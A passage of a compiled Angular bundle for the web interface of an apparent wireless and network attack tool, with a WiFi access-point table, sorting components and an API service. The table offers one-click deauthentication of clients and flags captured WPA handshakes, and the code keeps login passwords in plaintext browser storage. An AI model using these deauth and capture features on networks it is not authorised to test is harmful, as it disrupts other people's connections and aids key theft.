            'TB',
            'PB'
        ];
    }
    SizePipe.prototype.transform = function (bytes, precision) {
        if (bytes === void 0) { bytes = 0; }
        if (precision === void 0) { precision = 2; }
        var sbytes = String(bytes);
        if (isNaN(parseFloat(sbytes)) || !isFinite(bytes))
            return sbytes;
        else if (bytes == 0)
            return '0';
        var unit = 0;
        while (bytes >= 1024) {
            bytes /= 1024;
            unit++;
        }
        return bytes.toFixed(+precision) + ' ' + this.units[unit];
    };
    SizePipe = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Pipe"])({ name: 'size' })
    ], SizePipe);
    return SizePipe;
}());



/***/ }),

/***/ "./src/app/components/sortable-column/sortable-column.component.html":
/*!***************************************************************************!*\
  !*** ./src/app/components/sortable-column/sortable-column.component.html ***!
  \***************************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<span style=\"cursor: pointer\" class=\"nowrap\">\n  <ng-content></ng-content>\n  <span style=\"margin-left:5px\">\n    <i class=\"fa fa-chevron-up\" *ngIf=\"sortDirection === 'desc'\" ></i>\n    <i class=\"fa fa-chevron-down\" *ngIf=\"sortDirection === 'asc'\"></i>\n  </span>\n</span>\n"

/***/ }),

/***/ "./src/app/components/sortable-column/sortable-column.component.ts":
/*!*************************************************************************!*\
  !*** ./src/app/components/sortable-column/sortable-column.component.ts ***!
  \*************************************************************************/
/*! exports provided: SortableColumnComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "SortableColumnComponent", function() { return SortableColumnComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_sort_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/sort.service */ "./src/app/services/sort.service.ts");



var SortableColumnComponent = /** @class */ (function () {
    function SortableColumnComponent(sortService) {
        this.sortService = sortService;
        this.sortDirection = '';
        this.sortType = '';
    }
    SortableColumnComponent.prototype.sort = function () {
        this.sortDirection = this.sortDirection === 'asc' ? 'desc' : 'asc';
        this.sortService.emitSort({
            field: this.columnName,
            direction: this.sortDirection,
            type: this.sortType,
        });
    };
    SortableColumnComponent.prototype.ngOnInit = function () {
        var _this = this;
        // subscribe to sort changes so we can react when other columns are sorted
        this.sortService.onSort.subscribe(function (event) {
            // reset this column's sort direction to hide the sort icons
            if (_this.columnName != event.field) {
                _this.sortDirection = '';
            }
        });
    };
    SortableColumnComponent.prototype.ngOnDestroy = function () {
    };
    tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Input"])('sortable-column'),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:type", String)
    ], SortableColumnComponent.prototype, "columnName", void 0);
    tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Input"])('sort-direction'),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:type", String)
    ], SortableColumnComponent.prototype, "sortDirection", void 0);
    tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Input"])('sort-type'),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:type", String)
    ], SortableColumnComponent.prototype, "sortType", void 0);
    tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["HostListener"])('click'),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:type", Function),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", []),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:returntype", void 0)
    ], SortableColumnComponent.prototype, "sort", null);
    SortableColumnComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: '[sortable-column]',
            template: __webpack_require__(/*! ./sortable-column.component.html */ "./src/app/components/sortable-column/sortable-column.component.html")
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_sort_service__WEBPACK_IMPORTED_MODULE_2__["SortService"]])
    ], SortableColumnComponent);
    return SortableColumnComponent;
}());



/***/ }),

/***/ "./src/app/components/unbash.pipe.ts":
/*!*******************************************!*\
  !*** ./src/app/components/unbash.pipe.ts ***!
  \*******************************************/
/*! exports provided: UnbashPipe */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "UnbashPipe", function() { return UnbashPipe; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var UnbashPipe = /** @class */ (function () {
    function UnbashPipe() {
    }
    // https://stackoverflow.com/questions/25245716/remove-all-ansi-colors-styles-from-strings
    UnbashPipe.prototype.transform = function (data) {
        return String(data).replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');
    };
    UnbashPipe = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Pipe"])({ name: 'unbash' })
    ], UnbashPipe);
    return UnbashPipe;
}());



/***/ }),

/***/ "./src/app/components/wifi-table/wifi-table.component.html":
/*!*****************************************************************!*\
  !*** ./src/app/components/wifi-table/wifi-table.component.html ***!
  \*****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"table-responsive\">\n  <table class=\"table table-dark table-sm\">\n    <thead>\n      <tr>\n        <th width=\"1%\" sortable-column=\"rssi\" sort-direction=\"asc\">RSSI</th>\n        <th sortable-column=\"mac\">BSSID</th>\n        <th sortable-column=\"hostname\">ESSID</th>\n        <th sortable-column=\"vendor\">Vendor</th>\n        <th sortable-column=\"encryption\" style=\"text-align:center\">Encryption</th>\n\n        <th width=\"1%\" *ngIf=\"hopping\" sortable-column=\"channel\">Ch</th>\n        <th width=\"1%\" *ngIf=\"!hopping\">\n          <button type=\"button\" class=\"btn btn-dark btn-sm\" (click)=\"api.cmd('wifi.recon.channel clear')\" placement=\"right\" ngbTooltip=\"Restore channel hopping.\">\n            <i class=\"fas fa-broadcast-tower\"></i>\n          </button>\n        </th>\n\n        <th width=\"1%\" sortable-column=\"clients\">Clients</th>\n        <th sortable-column=\"sent\">Sent</th>\n        <th sortable-column=\"received\">Recvd</th>\n        <th sortable-column=\"last_seen\">Seen</th>\n      </tr>\n    </thead>\n    <tbody>\n\n      <tr *ngIf=\"aps && aps.length == 0\">\n        <td colspan=\"11\" align=\"center\">\n          <i>empty</i>\n        </td>\n      </tr>\n\n      <ng-container *ngFor=\"let ap of aps | search: omnibar.query\">\n        <tr *ngIf=\"(!currAP || currAP.mac == ap.mac) && (!wifi || wifi.state.channels.includes(ap.channel))\" [class.alive]=\"ap | alive:1000\">\n          <td>\n            <ui-signal-indicator [signalstrength]=\"ap.rssi\"></ui-signal-indicator>\n          </td>\n          <td>\n            <div ngbDropdown [open]=\"visibleMenu == ap.mac\">\n              <button class=\"btn btn-sm btn-dark btn-action\" ngbDropdownToggle (click)=\"visibleMenu = (visibleMenu == ap.mac ? null : ap.mac)\">\n                {{ ap.mac | uppercase }}\n              </button>\n              <div ngbDropdownMenu class=\"menu-dropdown\">\n                <ul>\n                  <li>\n                    <a (click)=\"visibleMenu = null; clipboard.copy(ap.mac.toUpperCase())\">Copy</a>\n                  </li>\n                  <li>\n                    <a (click)=\"api.cmd('wifi.assoc ' + ap.mac); visibleMenu = null;\">Associate</a>\n                  </li>\n                  <li *ngIf=\"ap.clients.length > 0\">\n                    <a (click)=\"api.cmd('wifi.deauth ' + ap.mac); visibleMenu = null;\">Deauthenticate Clients</a>\n                  </li>\n                  <li>\n                    <a (click)=\"setAlias(ap); visibleMenu = null;\">Set Alias</a>\n                  </li>\n                </ul>\n              </div>\n            </div>\n          </td>\n\n          <td [class.empty]=\"ap.hostname === '<hidden>'\">\n            {{ ap.hostname }}\n            <span *ngIf=\"ap.alias\" class=\"badge badge-pill badge-secondary\" style=\"margin-left:5px\">{{ ap.alias }}</span>\n          </td>\n\n          <td [class.empty]=\"!ap.vendor\">\n            {{ ap.vendor ? ap.vendor : 'unknown' }}\n          </td>\n\n          <td align=\"center\" class=\"nowrap\">\n            <i *ngIf=\"ap.encryption === 'OPEN'\" class=\"fas fa-unlock empty\" placement=\"top\" ngbTooltip=\"Open Network\"></i>\n\n            <span *ngIf=\"ap.encryption !== 'OPEN'\" ngbTooltip=\"{{ ap.cipher }}, {{ ap.authentication}}\">\n              <i *ngIf=\"ap.handshake\" style=\"color: red; margin-right: 5px\" ngbTooltip=\"WPA key material captured to {{ api.env('wifi.handshakes.file') }}\" class=\"fas fa-key\"></i>\n              {{ ap.encryption }}\n            </span>\n\n            <div ngbDropdown *ngIf=\"(ap.wps | json) != '{}'\" [open]=\"visibleWPS == ap.mac\" placement=\"left\" style=\"display: inline\">\n              <button ngbDropdownToggle \n                class=\"btn btn-sm badge badge-secondary btn-action drop-small btn-tiny\" \n                (click)=\"visibleWPS = (visibleWPS == ap.mac ? null : ap.mac)\">\n                WPS \n              </button>\n\n              <div ngbDropdownMenu class=\"menu-dropdown\">\n                <table class=\"table table-sm table-dark\">\n                  <tbody>\n                    <tr *ngFor=\"let item of ap.wps | keyvalue\">\n                      <th>{{ item.key }}</th>\n                      <td>{{ item.value }}</td>\n                    </tr>\n                  </tbody>\n                </table>\n              </div>\n            </div>\n\n          </td>\n          \n          <td *ngIf=\"hopping\" align=\"center\">\n            <button type=\"button\" class=\"btn btn-dark btn-sm btn-action\" (click)=\"api.cmd('wifi.recon.channel ' + ap.channel)\" ngbTooltip=\"Stay on channel {{ ap.channel }}.\">\n              {{ ap.channel }}\n            </button>\n          </td>\n          <td *ngIf=\"!hopping\" align=\"center\">\n            {{ ap.channel }}\n          </td>\n\n          <td [class.empty]=\"ap.clients.length == 0\" align=\"center\">\n            <span *ngIf=\"ap.clients.length == 0\">0</span>\n            <span *ngIf=\"ap.clients.length > 0\">\n              <span style=\"cursor:pointer;\" class=\"badge badge-danger\" (click)=\"currAP = (currAP ? null : ap)\">\n                {{ ap.clients.length }}\n                <i *ngIf=\"!currAP\" class=\"fas fa-angle-right\"></i>\n                <i *ngIf=\"currAP && currAP.mac == ap.mac\" class=\"fas fa-angle-down\"></i>\n              </span>\n            </span>\n          </td>\n\n          <td [class.empty]=\"!ap.sent\">{{ ap.sent | size }}</td>\n          <td [class.empty]=\"!ap.received\">{{ ap.received | size }}</td>\n          <td class=\"time\">{{ ap.last_seen | date: 'HH:mm:ss' }}</td>\n\n        </tr>\n      </ng-container>\n    </tbody>\n  </table>\n  \n  <table *ngIf=\"currAP\" class=\"table table-sm table-dark\">\n    <thead>\n      <tr>\n        <th style=\"width:1%\">RSSI</th>\n        <th style=\"width:1%\">MAC</th>\n        <th>Vendor</th>\n        <th>Sent</th>\n        <th>Recvd</th>\n        <th style=\"width:1%\" class=\"nowrap\">First Seen</th>\n        <th style=\"width:1%\" class=\"nowrap\">Last Seen</th>\n      </tr>\n    </thead>\n    <tbody>\n      <tr *ngIf=\"currAP.clients.length == 0\">\n        <td colspan=\"2\" align=\"center\">\n          <i>empty</i>\n        </td>\n      </tr>\n\n      <tr *ngFor=\"let client of currAP.clients | search: omnibar.query\">\n        <td>\n          <ui-signal-indicator [signalstrength]=\"client.rssi\"></ui-signal-indicator>\n        </td>\n        <td class=\"nowrap\">\n          <span ngbDropdown [open]=\"visibleClientMenu == client.mac\">\n            <button class=\"btn btn-sm btn-dark btn-action\" ngbDropdownToggle (click)=\"visibleClientMenu = (visibleClientMenu == client.mac ? null : client.mac)\">\n              {{ client.mac | uppercase }}\n            </button>\n            <div ngbDropdownMenu class=\"menu-dropdown\">\n              <ul>\n                <li>\n                  <a (click)=\"visibleMenu = null; clipboard.copy(client.mac.toUpperCase())\">Copy</a>\n                </li>\n                <li>\n                  <a (click)=\"setAlias(client); visibleClientMenu = null;\">Set Alias</a>\n                </li>\n                <li>\n                  <a (click)=\"api.cmd('wifi.deauth ' + client.mac); visibleClientMenu = null;\">Deauthenticate</a>\n                </li>\n              </ul>\n            </div>\n          </span>  \n\n          <span *ngIf=\"client.alias\" (click)=\"setAlias(client)\" class=\"badge badge-pill badge-secondary\" style=\"margin-left: 5px; cursor:pointer\">\n            {{ client.alias }}\n          </span>\n        </td>\n        <td [class.empty]=\"!client.vendor\">\n          {{ client.vendor ? client.vendor : 'unknown' }}\n        </td>\n        <td class=\"nowrap\" [class.empty]=\"!client.sent\">{{ client.sent | size }}</td>\n        <td class=\"nowrap\" [class.empty]=\"!client.received\">{{ client.received | size }}</td>\n        <td>\n          {{ client.first_seen | date: 'HH:mm:ss' }}\n        </td>\n        <td>\n          {{ client.last_seen | date: 'HH:mm:ss' }}\n        </td>\n      </tr>\n    </tbody>\n  </table>\n</div>\n\n<div id=\"inputModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"inputModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\">\n          <h5 id=\"inputModalTitle\"></h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doSetAlias()\">\n          <div class=\"form-group row\">\n            <div class=\"col\">\n              <input type=\"text\" class=\"form-control param-input\" id=\"in\" value=\"\">\n              <input type=\"hidden\" id=\"inhost\" value=\"\">\n            </div>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-dark\">Ok</button>\n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n\n"

/***/ }),

/***/ "./src/app/components/wifi-table/wifi-table.component.scss":
/*!*****************************************************************!*\
  !*** ./src/app/components/wifi-table/wifi-table.component.scss ***!
  \*****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL2NvbXBvbmVudHMvd2lmaS10YWJsZS93aWZpLXRhYmxlLmNvbXBvbmVudC5zY3NzIn0= */"

/***/ }),

/***/ "./src/app/components/wifi-table/wifi-table.component.ts":
/*!***************************************************************!*\
  !*** ./src/app/components/wifi-table/wifi-table.component.ts ***!
  \***************************************************************/
/*! exports provided: WifiTableComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "WifiTableComponent", function() { return WifiTableComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_sort_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/sort.service */ "./src/app/services/sort.service.ts");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");
/* harmony import */ var _services_clipboard_service__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../../services/clipboard.service */ "./src/app/services/clipboard.service.ts");






var WifiTableComponent = /** @class */ (function () {
    function WifiTableComponent(api, sortService, omnibar, clipboard) {
        this.api = api;
        this.sortService = sortService;
        this.omnibar = omnibar;
        this.clipboard = clipboard;
        this.aps = [];
        this.visibleWPS = null;
        this.visibleClients = {};
        this.visibleMenu = null;
        this.visibleClientMenu = null;
        this.currAP = null;
        this.hopping = true;
        this.sort = { field: 'rssi', direction: 'asc', type: '' };
        this.update(this.api.session);
    }
    WifiTableComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.api.onNewData.subscribe(function (session) {
            _this.update(session);
        });
        this.sortSub = this.sortService.onSort.subscribe(function (event) {
            _this.sort = event;
            _this.sortService.sort(_this.aps, event);
        });
    };
    WifiTableComponent.prototype.ngOnDestroy = function () {
        this.sortSub.unsubscribe();
    };
    WifiTableComponent.prototype.setAlias = function (host) {
        $('#in').val(host.alias);
        $('#inhost').val(host.mac);
        $('#inputModalTitle').html('Set alias for ' + host.mac);
        $('#inputModal').modal('show');
    };
    WifiTableComponent.prototype.doSetAlias = function () {
        $('#inputModal').modal('hide');
        var mac = $('#inhost').val();
        var alias = $('#in').val();
        if (alias.trim() == "")
            alias = '""';
        this.api.cmd("alias " + mac + " " + alias);
    };
    WifiTableComponent.prototype.update = function (session) {
        this.wifi = this.api.module('wifi');
        if (this.wifi && this.wifi.state && this.wifi.state.channels) {
            this.hopping = this.wifi.state.channels.length > 1;
        }
        if ($('.menu-dropdown').is(':visible'))
            return;
        var aps = session.wifi['aps'];
        if (aps.length == 0)
            this.currAP = null;
        this.aps = aps;
        this.sortService.sort(this.aps, this.sort);
        if (this.currAP != null) {
            for (var i = 0; i < this.aps.length; i++) {
                var ap = this.aps[i];
                if (ap.mac == this.currAP.mac) {
                    this.currAP = ap;
                    break;
                }
            }
            this.sortService.sort(this.currAP.clients, this.sort);
        }
    };
    WifiTableComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-wifi-table',
            template: __webpack_require__(/*! ./wifi-table.component.html */ "./src/app/components/wifi-table/wifi-table.component.html"),
            styles: [__webpack_require__(/*! ./wifi-table.component.scss */ "./src/app/components/wifi-table/wifi-table.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_3__["ApiService"], _services_sort_service__WEBPACK_IMPORTED_MODULE_2__["SortService"], _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__["OmniBarService"], _services_clipboard_service__WEBPACK_IMPORTED_MODULE_5__["ClipboardService"]])
    ], WifiTableComponent);
    return WifiTableComponent;
}());



/***/ }),

/***/ "./src/app/guards/auth.guard.ts":
/*!**************************************!*\
  !*** ./src/app/guards/auth.guard.ts ***!
  \**************************************/
/*! exports provided: AuthGuard */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AuthGuard", function() { return AuthGuard; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../services/api.service */ "./src/app/services/api.service.ts");




var AuthGuard = /** @class */ (function () {
    function AuthGuard(router, api) {
        this.router = router;
        this.api = api;
    }
    AuthGuard.prototype.canActivate = function (route, state) {
        if (this.api.Ready()) {
            return true;
        }
        this.router.navigate(['/login'], { queryParams: { returnTo: state.url } });
        return false;
    };
    AuthGuard = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Injectable"])({ providedIn: 'root' }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_angular_router__WEBPACK_IMPORTED_MODULE_2__["Router"],
            _services_api_service__WEBPACK_IMPORTED_MODULE_3__["ApiService"]])
    ], AuthGuard);
    return AuthGuard;
}());



/***/ }),

/***/ "./src/app/services/api.service.ts":
/*!*****************************************!*\
  !*** ./src/app/services/api.service.ts ***!
  \*****************************************/
/*! exports provided: Settings, Credentials, ApiService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "Settings", function() { return Settings; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "Credentials", function() { return Credentials; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "ApiService", function() { return ApiService; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm5/http.js");
/* harmony import */ var compare_versions__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! compare-versions */ "./node_modules/compare-versions/index.js");
/* harmony import */ var compare_versions__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(compare_versions__WEBPACK_IMPORTED_MODULE_3__);
/* harmony import */ var rxjs_Observable__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! rxjs/Observable */ "./node_modules/rxjs-compat/_esm5/Observable.js");
/* harmony import */ var rxjs_operators__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! rxjs/operators */ "./node_modules/rxjs/_esm5/operators/index.js");
/* harmony import */ var rxjs_internal_observable_interval__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! rxjs/internal/observable/interval */ "./node_modules/rxjs/internal/observable/interval.js");
/* harmony import */ var rxjs_internal_observable_interval__WEBPACK_IMPORTED_MODULE_6___default = /*#__PURE__*/__webpack_require__.n(rxjs_internal_observable_interval__WEBPACK_IMPORTED_MODULE_6__);
/* harmony import */ var rxjs_add_operator_map__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! rxjs/add/operator/map */ "./node_modules/rxjs-compat/_esm5/add/operator/map.js");
/* harmony import */ var rxjs_add_operator_catch__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! rxjs/add/operator/catch */ "./node_modules/rxjs-compat/_esm5/add/operator/catch.js");
/* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ../../environments/environment */ "./src/environments/environment.ts");










var Settings = /** @class */ (function () {
    function Settings() {
        this.schema = document.location.protocol || 'http:';
        this.host = document.location.hostname || "127.0.0.1";
        this.port = (document.location.protocol || 'http:') == 'http:' ? '8081' : '8083';
        this.path = '/api';
        this.interval = 1000;
        this.events = 25;
        this.muted = [];
        this.omnibar = true;
        this.pinned = {
            modules: {},
            caplets: {}
        };
    }
    Settings.prototype.URL = function () {
        return this.schema + '//' + this.host + ':' + this.port + this.path;
    };
    Settings.prototype.Warning = function () {
        if (this.host == 'localhost' || this.host == '127.0.0.1')
            return false;
        return this.schema != 'https:';
    };
    Settings.prototype.isPinned = function (name) {
        return (name in this.pinned.modules) || (name in this.pinned.caplets);
    };
    Settings.prototype.pinToggle = function (name, what) {
        if (what == 'caplet') {
            if (this.isPinned(name))
                delete this.pinned.caplets[name];
            else
                this.pinned.caplets[name] = true;
        }
        else {
            if (this.isPinned(name))
                delete this.pinned.modules[name];
            else
                this.pinned.modules[name] = true;
        }
    };
    Settings.prototype.from = function (obj) {
        this.schema = obj.schema || this.schema;
        this.host = obj.host || this.host;
        this.port = obj.port || this.port;
        this.path = obj.path || this.path;
        this.interval = obj.interval || this.interval;
        this.events = obj.events || this.events;
        this.muted = obj.muted || this.muted;
        this.omnibar = obj.omnibar || this.omnibar;
        this.pinned = obj.pinned || this.pinned;
    };
    Settings.prototype.save = function () {
        localStorage.setItem('settings', JSON.stringify({
            schema: this.schema,
            host: this.host,
            port: this.port,
            path: this.path,
            interval: this.interval,
            events: this.events,
            muted: this.muted,
            omnibar: this.omnibar,
            pinned: this.pinned
        }));
    };
    return Settings;
}());

var Credentials = /** @class */ (function () {
    function Credentials() {
        this.valid = false;
        this.user = "";
        this.pass = "";
        this.headers = null;
    }
    Credentials.prototype.set = function (user, pass) {
        this.user = user;
        this.pass = pass;
        this.headers = new _angular_common_http__WEBPACK_IMPORTED_MODULE_2__["HttpHeaders"]().set("Authorization", "Basic " + btoa(this.user + ":" + this.pass));
    };
    Credentials.prototype.save = function () {
        localStorage.setItem('auth', JSON.stringify({
            username: this.user,
            password: this.pass
        }));
    };
    Credentials.prototype.clear = function () {
        this.user = "";
        this.pass = "";
        this.headers = null;
    };
    return Credentials;
}());

var ApiService = /** @class */ (function () {
    function ApiService(http) {
        var _this = this;
        this.http = http;
        // what API to interact with and how to interact with it
        this.settings = new Settings();
        // updated session object
        this.session = null;
        // updated events objects
        this.events = new Array();
        // current /api/session execution time in milliseconds
        this.ping = 0;
        // true if updates have been paused
        this.paused = false;
        // filled if /api/session can't be retrieved
        this.error = null;
        // if filled it will pass the parameter once to /api/session
        this.sessionFrom = '';
        // if filled it will pass the parameter once to /api/events
        this.eventsFrom = '';
        // triggerd when the session object has been updated
        this.onNewData = new _angular_core__WEBPACK_IMPORTED_MODULE_1__["EventEmitter"]();
        // triggered when the events have been updated
        this.onNewEvents = new _angular_core__WEBPACK_IMPORTED_MODULE_1__["EventEmitter"]();
        // triggered when the user credentials are not valid
        this.onLoggedOut = new _angular_core__WEBPACK_IMPORTED_MODULE_1__["EventEmitter"]();
        // triggered when the user credentials are valid and he's just been logged in
        this.onLoggedIn = new _angular_core__WEBPACK_IMPORTED_MODULE_1__["EventEmitter"]();
        // triggered when there's an error (either bad auth or just the api is down) on /api/session
        this.onSessionError = new _angular_core__WEBPACK_IMPORTED_MODULE_1__["EventEmitter"]();
        // triggered when a command returns an error
        this.onCommandError = new _angular_core__WEBPACK_IMPORTED_MODULE_1__["EventEmitter"]();
        this.creds = new Credentials();
        // we use these observable objects to return a cached
        // version of the session or the events when an error
        // occurs
        this.cachedSession = new rxjs_Observable__WEBPACK_IMPORTED_MODULE_4__["Observable"](function (observer) {
            observer.next(_this.session);
            observer.complete();
        });
        this.cachedEvents = new rxjs_Observable__WEBPACK_IMPORTED_MODULE_4__["Observable"](function (observer) {
            observer.next(_this.events);
            observer.complete();
        });
        // credentials might be stored in the local storage already,
        // try to load and authenticate with them in order to restore
        // the user session
        this.loadStorage();
    }
    // return true if the user is logged in with valid credentials
    // and we got the first session object
    ApiService.prototype.Ready = function () {
        return this.creds.valid && this.session && this.session.modules && this.session.modules.length > 0;
    };
    // return a module given its name
    // TODO: just use a dictionary for session.modules!
    ApiService.prototype.module = function (name) {
        for (var i = 0; i < this.session.modules.length; i++) {
            var mod = this.session.modules[i];
            if (mod.name == name) {
                return mod;
            }
        }
        return null;
    };
    ApiService.prototype.env = function (name) {
        for (var key in this.session.env.data) {
            if (name == key)
                return this.session.env.data[key];
        }
        return "";
    };
    // start polling /api/events every second
    ApiService.prototype.pollEvents = function () {
        var _this = this;
        console.log("api.pollEvents() started");
        return Object(rxjs_internal_observable_interval__WEBPACK_IMPORTED_MODULE_6__["interval"])(this.settings.interval)
            .pipe(Object(rxjs_operators__WEBPACK_IMPORTED_MODULE_5__["startWith"])(0), Object(rxjs_operators__WEBPACK_IMPORTED_MODULE_5__["switchMap"])(function () { return _this.getEvents(); }));
    };
    // start polling /api/session every second
    ApiService.prototype.pollSession = function () {
        var _this = this;
        console.log("api.pollSession() started");
        return Object(rxjs_internal_observable_interval__WEBPACK_IMPORTED_MODULE_6__["interval"])(this.settings.interval)
            .pipe(Object(rxjs_operators__WEBPACK_IMPORTED_MODULE_5__["startWith"])(0), Object(rxjs_operators__WEBPACK_IMPORTED_MODULE_5__["switchMap"])(function () { return _this.getSession(); }));
    };
    // set the user credentials and try to login
    ApiService.prototype.login = function (username, password) {
        console.log("api.login()");
        this.creds.set(username, password);
        return this.getSession();
    };
    // log out the user
    ApiService.prototype.logout = function () {
        if (this.creds.valid == false)
            return;
        console.log("api.logout()");
        this.clearStorage();
        this.creds.valid = false;
    };
    // read settings and user credentials from the local storage if available
    ApiService.prototype.loadStorage = function () {
        var _this = this;
        var sets = localStorage.getItem('settings');
        if (sets) {
            this.settings.from(JSON.parse(sets));
        }
        var auth = localStorage.getItem('auth');
        if (auth) {
            var creds = JSON.parse(auth);
            console.log("found stored credentials");
            this.login(creds.username, creds.password).subscribe(function (session) {
